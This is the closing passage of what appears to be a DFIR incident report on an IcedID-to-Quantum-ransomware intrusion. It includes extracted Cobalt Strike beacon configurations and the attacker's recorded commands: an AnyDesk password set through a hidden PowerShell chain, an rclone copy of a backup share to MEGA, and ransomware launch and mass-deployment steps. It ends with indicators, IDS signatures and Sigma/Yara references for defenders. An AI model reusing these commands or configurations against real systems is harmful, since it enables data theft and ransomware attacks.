+    "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC1nAS8+PqMnQs3hynG2JDgMQK6ZqLkIoDXWnqaOS/dQsdKBHE0Ify/HIZ2ntSpyMtvomDHCA98pCEi1L7mT0mvfiYapP9Aj776rDpzXMYNiRk1BWrAzJqzLcfwzxJx26hL1VSu1C5mWEl7JsVT/9l/kHcNYAALgNQuI0uZAqM7YQIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
+  },
+  "host_header": "",
+  "useragent_header": null,
+  "http-get": {
+    "uri": "/ak.css",
+    "verb": "GET",
+    "client": {
+      "headers": null,
+      "metadata": null
+    },
+    "server": {
+      "output": [
+        "print",
+        "prepend 1767 characters",
+        "base64",
+        "base64url"
+      ]
+    }
+  },
+  "http-post": {
+    "uri": "/profile",
+    "verb": "POST",
+    "client": {
+      "headers": null,
+      "id": null,
+      "output": null
+    }
+  },
+  "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
+  "crypto_scheme": 0,
+  "proxy": {
+    "type": null,
+    "username": null,
+    "password": null,
+    "behavior": "Use IE settings"
+  },
+  "http_post_chunk": 0,
+  "uses_cookies": true,
+  "post-ex": {
+    "spawnto_x86": "%windir%\\syswow64\\rundll32.exe",
+    "spawnto_x64": "%windir%\\sysnative\\rundll32.exe"
+  },
+  "process-inject": {
+    "allocator": "VirtualAllocEx",
+    "execute": [
+      "CreateThread",
+      "CreateRemoteThread",
+      "RtlCreateUserThread"
+    ],
+    "min_alloc": 9369,
+    "startrwx": false,
+    "stub": "Ms1B7fCBDFtfSY7fRzHMbQ==",
+    "transform-x86": [
+      "prepend '\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90'"
+    ],
+    "transform-x64": [
+      "prepend '\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90'"
+    ],
+    "userwx": false
+  },
+  "dns-beacon": {
+    "dns_idle": null,
+    "dns_sleep": null,
+    "maxdns": null,
+    "beacon": null,
+    "get_A": null,
+    "get_AAAA": null,
+    "get_TXT": null,
+    "put_metadata": null,
+    "put_output": null
+  },
+  "pipename": null,
+  "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
+  "stage": {
+    "cleanup": true
+  },
+  "ssh": {
+    "hostname": null,
+    "port": null,
+    "username": null,
+    "password": null,
+    "privatekey": null
+  }
+}
+Configurations for other Cobalt Strike servers observed:
+
+{
+    "beacontype": [
+        "HTTPS"
+    ],
+    "sleeptime": 60000,
+    "jitter": 0,
+    "maxgetsize": 1048576,
+    "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==",
+    "license_id": 0,
+    "cfg_caution": false,
+    "kill_date": null,
+    "server": {
+        "hostname": "111.90.143.191",
+        "port": 443,
+        "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnOM3nXx+7HBhkbDd+AwFrFisSunK999w2tM0uTpuuEiBalcJhcL+QgQWtf6S7zPp5hjImG+2YcPl18geU4f5JlSPXHwilbK4DFb/ePWyKFjhrA7emVRqhM21QMlo1ANsn14rY/RO2pzuft8P7TXoIjjI/B2GGVuzYNZX6X4I2EwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
+    },
+    "host_header": "",
+    "useragent_header": null,
+    "http-get": {
+        "uri": "/j.ad",
+        "verb": "GET",
+        "client": {
+            "headers": null,
+            "metadata": null
+        },
+        "server": {
+            "output": [
+                "print"
+            ]
+        }
+    },
+    "http-post": {
+        "uri": "/submit.php",
+        "verb": "POST",
+        "client": {
+            "headers": null,
+            "id": null,
+            "output": null
+        }
+    },
+    "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
+    "crypto_scheme": 0,
+    "proxy": {
+        "type": null,
+        "username": null,
+        "password": null,
+        "behavior": "Use IE settings"
+    },
+    "http_post_chunk": 0,
+    "uses_cookies": true,
+    "post-ex": {
+        "spawnto_x86": "%windir%\\syswow64\\rundll32.exe",
+        "spawnto_x64": "%windir%\\sysnative\\rundll32.exe"
+    },
+    "process-inject": {
+        "allocator": "VirtualAllocEx",
+        "execute": [
+            "CreateThread",
+            "SetThreadContext",
+            "CreateRemoteThread",
+            "RtlCreateUserThread"
+        ],
+        "min_alloc": 0,
+        "startrwx": true,
+        "stub": "Ms1B7fCBDFtfSY7fRzHMbQ==",
+        "transform-x86": null,
+        "transform-x64": null,
+        "userwx": true
+    },
+    "dns-beacon": {
+        "dns_idle": null,
+        "dns_sleep": null,
+        "maxdns": null,
+        "beacon": null,
+        "get_A": null,
+        "get_AAAA": null,
+        "get_TXT": null,
+        "put_metadata": null,
+        "put_output": null
+    },
+    "pipename": null,
+    "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
+    "stage": {
+        "cleanup": false
+    },
+    "ssh": {
+        "hostname": null,
+        "port": null,
+        "username": null,
+        "password": null,
+        "privatekey": null
+    }
+}
+{
+    "beacontype": [
+        "HTTPS"
+    ],
+    "sleeptime": 60000,
+    "jitter": 0,
+    "maxgetsize": 1048576,
+    "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==",
+    "license_id": 305419776,
+    "cfg_caution": false,
+    "kill_date": null,
+    "server": {
+        "hostname": "78.128.112.139",
+        "port": 443,
+        "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnOM3nXx+7HBhkbDd+AwFrFisSunK999w2tM0uTpuuEiBalcJhcL+QgQWtf6S7zPp5hjImG+2YcPl18geU4f5JlSPXHwilbK4DFb/ePWyKFjhrA7emVRqhM21QMlo1ANsn14rY/RO2pzuft8P7TXoIjjI/B2GGVuzYNZX6X4I2EwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
+    },
+    "host_header": "",
+    "useragent_header": null,
+    "http-get": {
+        "uri": "/ga.js",
+        "verb": "GET",
+        "client": {
+            "headers": null,
+            "metadata": null
+        },
+        "server": {
+            "output": [
+                "print"
+            ]
+        }
+    },
+    "http-post": {
+        "uri": "/submit.php",
+        "verb": "POST",
+        "client": {
+            "headers": null,
+            "id": null,
+            "output": null
+        }
+    },
+    "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
+    "crypto_scheme": 0,
+    "proxy": {
+        "type": null,
+        "username": null,
+        "password": null,
+        "behavior": "Use IE settings"
+    },
+    "http_post_chunk": 0,
+    "uses_cookies": true,
+    "post-ex": {
+        "spawnto_x86": "%windir%\\syswow64\\rundll32.exe",
+        "spawnto_x64": "%windir%\\sysnative\\rundll32.exe"
+    },
+    "process-inject": {
+        "allocator": "VirtualAllocEx",
+        "execute": [
+            "CreateThread",
+            "SetThreadContext",
+            "CreateRemoteThread",
+            "RtlCreateUserThread"
+        ],
+        "min_alloc": 0,
+        "startrwx": true,
+        "stub": "tUr+Aexqde3zXhpE+L05KQ==",
+        "transform-x86": null,
+        "transform-x64": null,
+        "userwx": true
+    },
+    "dns-beacon": {
+        "dns_idle": null,
+        "dns_sleep": null,
+        "maxdns": null,
+        "beacon": null,
+        "get_A": null,
+        "get_AAAA": null,
+        "get_TXT": null,
+        "put_metadata": null,
+        "put_output": null
+    },
+    "pipename": null,
+    "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
+    "stage": {
+        "cleanup": false
+    },
+    "ssh": {
+        "hostname": null,
+        "port": null,
+        "username": null,
+        "password": null,
+        "privatekey": null
+    }
+}
+Remote Access Software
+As shown above, three different Remote Access Software were used by the threat actor:
+
+Atera
+Splashtop
+AnyDesk
+It is unclear why the threat actor used three different tools in order to establish an interactive and persistent command and control channel.
+
+
+
+
+
+
+
+The AnyDesk service password was set manually using the command line as shown below:
+
+
+
+powershell -np -w hidden -encodedcommand JABzAD0ATgBlAHcAL [.....] --> CS beacon
+  --> "c:\windows\syswow64\windowspowershell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile
+    -->  C:\Windows\system32\cmd.exe /C cmd.exe /c echo Qwerty123!@#_! | C:\ProgramData\anydesk.exe --set-password
+The software packages were bundled within a single Microsoft Software Installer (MSI) package, named hp.msi. This was installed from the ProgramData folder, resulting in the installation of the remote management tools. The activity can be correlated against the Application log for MSI installer events (Event ID 1033).
+
+
+
+Exfiltration
+During the intrusion, the threat actors were observed accessing collected data such as ShareFinder.txt using Notepad and then copying the contents to the clipboard.
+
+Whilst the process activity indicated Active Directory accounts being used, correlating this activity to Clipboard activity indicated matching sessions, process IDs, and the true source of the user.
+
+In this case, ShareFinder.txt was created in the ProgramData folder by the ShareFinder.ps1 script. Approximately 2 seconds later, the threat actors accessed this file and copied the contents.
+
+
+While the threat actors made attempts to proxy RDP traffic and minimize external RDP access, the threat actors’ workstation was revealed in several Windows logs. Sysmon Event ID 24 linked the threat actors host name HYPERV and the IPv4 address of 199.101.184[.]230. This host name was also in the Security events:
+
+
+
+For example, Event 4779 relating to a user disconnecting from a terminal session, reveals the client name of the source workstation. The client address was the internal workstation where the RDP traffic was being proxied through.
+
+
+
+Exfiltrated Documents Opened Remotely
+During the second day of the intrusion, documents from the organization were opened remotely from 212.102.59[.]162 and 165.231.182[.]14. This occurred before Rclone was used, which leads us to believe the documents were exfiltrated over one of the encrypted C2 channels.
+
+
+
+Rclone
+On the backup server, rclone.exe was used in order to exfiltrate data to a MEGA cloud storage.
+
+rclone.exe  copy --max-age 5y "\\[REDACTED BACKUP]\E:\[REDACTED]\" remote:Groups --exclude "*.{psd,7z,dwg,rar,MTS,MOV,pst,PRF,mp3,skp,tmp,gcp,zip,ZIP,MP4,tiff,ava4,psb,tif,DNG,AVI,FIT,FIL,mp4,dxf,mov,rcs,mdb,iso,json,man,exe,gz,ISO,dll,BAK,bak,tib,MP3,tar,m4v,vmdk,vm,PBD,db,BAKDB,icon,msi,ai,gif,cab,iso,png,eps,lib,avi,msg,crs,LIB,CRS,mpg,dcm,tif}" -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P
+From the rclone.exe configuration file, we can retrieve the user’s mail address and password.
+
+
+
+Mega user account:
+
+goodvibe888@proton.me
+Impact
+Alert
+Interestingly, the operator issued a command that displayed an alert informing the end user of a compromise, specifically with Cobalt Strike. Its unclear why the operator chose to do this, as this was around three hours prior to the ransomware being executed or a ransom note being dropped.
+
+
+
+The alert message that was visible:
+
+
+
+The activity can be observed in the PowerShell WinEvent logs:
+
+
+
+Ransomware
+The threat actors dropped the first of their ransomware binaries on the fourth day of the intrusion. Around 40 minutes after creating the alert messages for Cobalt Strike to show up, they dropped locker_64.exe on the backup server. They created a file (2.txt) and populated it with a list of hosts they had uncovered during their discovery activity. The locker_64.exe file was then renamed to 64.exe and executed using the text file in the command arguments:
+
+64.exe /target=@2.txt
+The threat actors attempted to execute the malware across all hosts in the target list, but only execution on the backup server was observed.
+
+The threat actor then tried again on a different server using a DLL this time:
+
+rundll32 locker_32.dll,run /target=@2.txt
+Again, only execution on the server was observed. They then executed a new Cobalt Strike PowerShell beacon on a 3rd server and executed the ramsomware using that.
+
+"c:\windows\syswow64\windowspowershell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile
+     ➝ C:\Windows\system32\cmd.exe /C locker_64.exe
+They then opened an RDP connection back to the primary domain controller and proceeded to try to execute the binary with a target list again. After only affecting the single host, the threat actors dropped several batch scripts on the server:
+
+pass.bat
+1.bat
+2.bat
+The script pass.bat proceeded to reset all the user accounts in the domain to a single password set by the threat actors.
+
+
+
+There were thousands of Windows Security Event ID 4724 events generated within a two minute period.
+
+
+
+This password reset would enable the next scripts to function as intended while also hampering any recovery activity.
+
+The 1.bat file then proceeded to copy the ransomware binary across to hosts in the environment.
+
+
+
+Finally 2.bat used the reset password to enable psexec to execute the ransomware on all the remote hosts.
+
+
+
+When the payload was executed, there were some telltale registry events observed indicating .Quantum file extension Shell Open Command artifacts.
+
+
+
+The HTML message was dropped in various directories across the endpoints:
+
+
+
+The HTML file displayed the all but familiar message:
+
+
+The following Locker files were then deleted:
+
+
+Diamond Model
+
+
+Timeline
+
+ 
+ 
+Indicators
+Atomic
+IcedID:
+
+alockajilly.com
+zoomersoidfor.com
+choifejuce.lol
+opiransiuera.com
+erinindiaka.quest
+opiransiuera.com
+zoomersoidfor.com
+considerf.info
+antiflamez.bar
+www.onlinecloud.cloud
+64.227.12.180:80
+5.196.103.145:443
+66.63.188.70:443
+178.128.85.30:443
+5.252.177.10:443
+46.101.19.119:443
+Cobalt Strike:
+
+fazehotafa.com
+guteyutu.com 
+45.66.151.109
+172.93.181.165
+111.90.143.191
+78.128.112.139
+Mega User:
+goodvibe888@proton[.]me
+
+Attacker Infrastructure:
+199.127.60[.]117
+199.101.184[.]230
+Computed
+Invoice-09-28#268_PDF.iso
+515047b6ce410001696812bc85e197d1
+26b11c95a6a324dbb0ab32428361b0531234ecee
+68f971a1b391f809058e83058a2037d29c28a8a21fd618b0d952466c632ff1be
+
+documents.lnk
+1af7a0e058ce1b63b138a1425a835561
+66b8da857c6dc45dea3a9fb17a503b3c2d203245
+1ee563caf943d3a7ed315dda9c37f0c9c445eec6dfb78ae196d2989626a0dfec
+
+eyewear.bat
+0d51c60c67c62836ba0f7948113b3737
+a597205ed55b6e6413a17edb62cbb29bda735676
+999cba918c297bf0b0d7d4aa9003e6338cc300a9270cc758d1d108c26603417d
+
+easygoing.dat
+f102a95e749d1ee63c71df902856ae51
+fda81b5951bb02ef0236088c310d9bc4fa70e1e6
+f27d924911a7087928012764358bad9240b2ba8aeeca5e0d717abdbb82344981
+
+rapuab1.dll
+ce1b0e77a31da8dc68f77a977b04f3e4
+5facd0aa9a29e0768ab9f432c79eac173af69711
+163800b0fbf1b1b7bbc7f719df421ed717111c7c9ddea9c9b41f898ee22dd51a
+
+9bd6b1f24b9589a3fbc1d54b6e6184b8
+f8473c6c8b298a3d72c8ca890667eddab62d2ba8
+03a9d6afc99e70333723d921bd1265ac948cdabb8b15689b5ceb1c02365a9572
+
+beacA.dll
+1b1497c2758ff5a8ade2df336a7a6c2d
+d6cc874f84797813c225318b877eace04ca5f5a1
+47ed0d1c7d8abc159d1eb2bb9fbe037f38b0846217cc11132652734f93ad5678
+
+beaconM-1664297797-T0B9Z_32-cr.exe
+dbb08886c60f3c44b377d09bd9d8b6d3
+7262b7df4d90409fb141856d9b55792872deda20
+8f7cc7cc14a12753d41678981b929546d12218d457a9d22951808cb5f19e549c
+
+df5ce1159ef2e257df92e1825d786d87
+a7e163eaa0fc2afb9c0d5ac6f79cb3e49919dd3c
+842737b5c36f624c9420a005239b04876990a2c4011db87fe67504fa09281031
+
+AD.bat
+e77f23aac8db0d23196b6bef64fe04fc
+90bf77e194970dd74d1b49faf58ae395ce49bb34
+c2ebcc389304539bc13c3d2023cf88f9ea0bac7210fefa03f8333eaab0bbb76d
+
+ns.bat
+7ac356035fce31e9e14c3a3d371ddf41
+61f838d9b0998ab23877e86f6e8ba3551799e07c
+4f52c7448bdcb4caa2eff701b0f3b60b406aea278ecd5a3b23cac808a65418e7
+
+92edbbeff775928cfc6e3c8efefe4ecc
+fffa0ce086791c41360971e3ce6a0d1af1701616
+fc4da07183de876a2b8ed1b35ec1e2657400da9d99a313452162399c519dbfc6
+
+955d0cf317efe48bf0394330fcd82ebb
+d84d40038311e188e25c78389b51b900de9c69bd
+e9da08831e0d4395f697e4f18c87be941bf52c79d84da1cc88186bdea1ebf4f4
+
+lsass.dll
+adc50d0c1e7bf37288a612a0f278e028
+6254e8cca47d87f29e85627a08ba88b79915a459
+fafc84466c1ce361bb6ce219bde2b64ca07a6a6feda23f444749ba06c44b0580
+
+397020072f5787dbbc0c344f98623bbd
+970e793c86266b20d280c04e0f41ec7ae9c2093c
+6511d6e84343c2d3a4cd36853170509e2751e27c86f67c6a031dc88e7e495e48
+
+601d613bff412d245e3edf46dc499d83
+a39b9119003c63583e2a0f11f19f3e6050399176
+2a2c83a7c8cd33e45dc14b8d955e00161580d6d2736f4e75a235aa3eb2f21528
+
+locker_32.dll
+131d277cfbc9f4b2d667150d84ad503d
+f05ff93ee4d2f31bc70c0484a559d562203b7700
+a378b8e9173f4a5469e7b5105be40723af29cbd6ee00d3b13ff437dae4514dff
+
+license.dat
+b31de50a57e8cb73c9efda8b97ffa261
+a7e3f617644599ec695da84d140a7b69c392a421
+55be890947d021fcc8c29af3c7aaf70d8132f222e944719c43a6e819e84a8f8b
+Detections
+Network
+ET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike
+ET Threatview.io High Confidence Cobalt Strike C2 IP group 2
+ET INFO Pastebin-style Service (textbin .net in TLS SNI)
+ET INFO Splashtop Domain (splashtop .com) in TLS SNI
+ET INFO Splashtop Domain in DNS Lookup (splashtop .com)
+ET MALWARE Meterpreter or Other Reverse Shell SSL Cert
+ET POLICY PE EXE or DLL Windows file download HTTP
+ET INFO Dotted Quad Host DLL Request
+ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download
+ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response
+ET HUNTING Suspicious lsass.exe in URI
+ET MALWARE Win32/IcedID Request Cookie
+ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software)
+ET USER_AGENTS AnyDesk Remote Desktop Software User-Agent
+ET EXPLOIT Possible Zerologon Phase 1/3 - NetrServerReqChallenge with 0x00 Client Challenge (CVE-2020-1472)
+ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1
+ET EXPLOIT Zerologon Phase 3/3 - Malicious NetrServerPasswordSet2 (CVE-2020-1472)
+Sigma
+https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_uninstall_defender.yml
+https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_winevent_security_query.yml
+https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_chcp_codepage_locale_lookup.yml
+https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_adfind_discovery.yml
+https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_system_time_lookup.yml
+https://github.com/SigmaHQ/sigma/blob/master/rules/windows/pipe_created/pipe_created_mal_cobaltstrike.yml
+https://github.com/NVISOsecurity/sigma-public/blob/master/rules/windows/process_creation/win_susp_recon_activity.yml
+https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml
+https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sysinternals_procdump.yml
+https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sysinternals_procdump_lsass.yml
+https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_nltest_recon.yml
+https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_regsvr32_network_activity.yml
+https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_lolbin_not_from_c_drive.yml
+https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_base64_encoded_cmd.yml
+https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_meterpreter_getsystem.yml
+https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/system/win_system_service_install_remote_access_software.yml
+https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_wmic_process_creation.yml
+https://github.com/SigmaHQ/sigma/blob/master/rules/windows/create_remote_thread/create_remote_thread_win_password_dumper_lsass.yml
+https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_cobaltstrike_operator_bloopers_cmds.yml
+Yara
+win_cobalt_strike_auto
+
+CobaltStrike__Resources_Artifact32_and_Resources_Dropper_v1_45_to_v4_x.yara
+
+https://github.com/The-DFIR-Report/Yara-Rules/blob/main/18041/18041.yar
+
